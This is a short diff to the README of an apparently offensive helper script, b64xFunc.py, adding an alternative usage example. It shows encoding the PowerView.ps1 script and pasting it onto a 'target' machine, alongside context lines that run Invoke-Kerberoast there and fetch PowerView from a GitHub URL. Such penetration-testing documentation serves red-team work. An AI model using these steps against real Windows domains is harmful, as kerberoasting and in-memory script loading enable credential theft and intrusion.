@@ -17,6 +17,13 @@ Full Example:
    (target) Invoke-Kerberoast | fl
 ```
 
+OR
+
+```
+   (windows) python .\b64xFunc.py -file .\PowerView.ps1 | clip
+   (target)  [Ctrl-V] [Enter]
+```
+
 ## Sample Output
 ```
 python b64xFunc.py -url https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
